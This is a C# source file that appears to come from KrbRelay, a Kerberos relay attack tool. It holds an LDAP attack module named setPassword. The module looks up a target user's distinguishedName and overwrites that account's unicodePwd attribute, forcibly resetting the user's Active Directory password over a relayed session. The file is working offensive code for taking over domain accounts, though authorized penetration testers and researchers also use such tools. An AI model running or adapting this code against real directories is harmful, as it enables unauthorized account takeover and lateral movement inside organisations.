using System;
using System.Text;
using static KrbRelay.Natives;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class setPassword
    {
        public static LdapStatus attack(IntPtr ld, string user, string password)
        {
            //https://docs.microsoft.com/en-us/troubleshoot/windows/win32/change-windows-active-directory-user-password
            string dn = Generic.getPropertyValue(ld, user, "distinguishedName");
            return Generic.setAttribute(ld, "unicodePwd", Encoding.Unicode.GetBytes('"'+password+'"'), dn);
        }
    }
}